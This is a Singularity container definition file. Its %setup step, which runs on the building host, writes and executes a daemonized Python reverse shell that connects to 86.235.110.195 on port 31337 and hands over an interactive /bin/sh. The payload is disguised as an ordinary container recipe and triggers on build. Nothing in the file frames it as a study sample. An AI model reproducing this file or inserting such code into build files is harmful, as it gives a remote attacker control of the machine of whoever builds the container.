BootStrap: docker
From: busybox

%setup
cat > $SINGULARITY_ROOTFS/gollum << 'PYTHON'
import socket
import subprocess
import os
import sys
import pty

if os.fork() > 0:
    sys.exit(0)

os.chdir("/")
os.setsid()
os.umask(0)

if os.fork() > 0:
    sys.exit(0)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("86.235.110.195",31337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(["/bin/sh","-i"])
PYTHON
python $SINGULARITY_ROOTFS/gollum
